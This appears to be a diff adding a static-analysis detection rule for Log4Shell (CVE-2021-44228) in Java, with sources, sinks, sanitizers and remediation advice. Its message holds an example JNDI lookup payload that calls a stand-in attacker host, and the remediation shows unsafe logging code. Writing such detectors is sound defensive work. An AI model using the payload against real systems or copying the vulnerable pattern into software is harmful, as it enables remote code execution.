@@ -1,0 +1,51 @@
+# RESEARCH EVIDENCE
+# CWE Source:      https://cwe.mitre.org/data/definitions/917.html
+# CVE:             CVE-2021-44228 (Log4Shell) — CVSS 10.0 Critical
+# CodeQL Source:   https://codeql.github.com/codeql-standard-libraries/java/
+# Semgrep Source:  https://semgrep.dev/r?q=log4shell
+# OWASP Cheat:     https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html
+# Verification:    Log4j 2.x user-controlled log message JNDI lookup sink verified from CVE-2021-44228 PoC and CodeQL.
+
+rule_id: java_log4j_user_input
+language: java
+vuln_class: Code Injection
+severity: Critical
+cwe: CWE-917
+owasp: A03:2021-Injection
+cvss_score: 10.0
+cvss_vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+confidence: Confirmed
+issue: 'Log4Shell (CVE-2021-44228): user-controlled input logged via Log4j 2.x enables
+  JNDI remote code execution'
+message: |-
+  User-controlled data (HTTP headers, query params, request body) is logged directly via Apache Log4j 2.x logger methods (logger.info(), logger.error(), logger.warn()). Log4j 2 processes lookup expressions like ${jndi:ldap://attacker.com/a} embedded in log messages. An attacker can trigger JNDI lookups leading to remote class loading and arbitrary Java code execution (CVE-2021-44228, CVSS 10.0).
+sources:
+- request.getParameter(
+- request.getHeader(
+- '@RequestParam'
+- '@PathVariable'
+- '@RequestBody'
+sinks:
+- logger.info(request
+- logger.error(request
+- logger.warn(request
+- log.info(header
+- LOG.error(param
+sanitizers:
+- log4j2.formatMsgNoLookups
+- PatternLayout.noLookups
+remediation: |-
+  Upgrade Log4j 2 to >= 2.17.1. Apply noLookups=true until upgrade is complete.
+
+  UNSAFE:
+    logger.info("User-Agent: {}", request.getHeader("User-Agent"));  /* Log4Shell trigger */
+    logger.error("Login attempt: " + request.getParameter("username"));
+
+  MITIGATE (JVM flag):
+    -Dlog4j2.formatMsgNoLookups=true  /* disables lookups in log messages */
+
+  FIX:
+    Upgrade to Log4j 2.17.1+ (Java 8) or 2.12.4+ (Java 7)
+    Or migrate to SLF4J + Logback which is not affected.
+
+  See Apache Log4j CVE-2021-44228 advisory and OWASP Logging Cheat Sheet.
